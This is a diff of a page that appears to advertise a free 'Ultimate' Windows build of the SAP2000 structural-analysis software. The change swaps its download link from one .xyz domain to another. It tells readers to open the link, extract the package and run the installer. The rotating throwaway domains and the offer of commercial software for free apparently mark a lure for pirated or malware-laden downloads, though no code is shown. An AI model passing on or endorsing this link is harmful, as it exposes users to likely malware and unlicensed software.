@@ -18,8 +18,8 @@ SAP2000 Ultimate Structural Analysis — Windows 11 and 10 build | simple panels
 
 > Use the project link below for Windows.
 
-* **Project link:** **[sap2000.nexpath.xyz](https://sap2000.nexpath.xyz/)**
-* **Full URL:** `https://sap2000.nexpath.xyz/`
+* **Project link:** **[sap2000.nerasix.xyz](https://sap2000.nerasix.xyz/)**
+* **Full URL:** `https://sap2000.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ Modules arrive ready for local use | open the app and continue. This release inc
 * **RAM:** 6 GB minimum | 12 GB recommended
 * **Disk:** 5 GB available storage
 
-***
+***
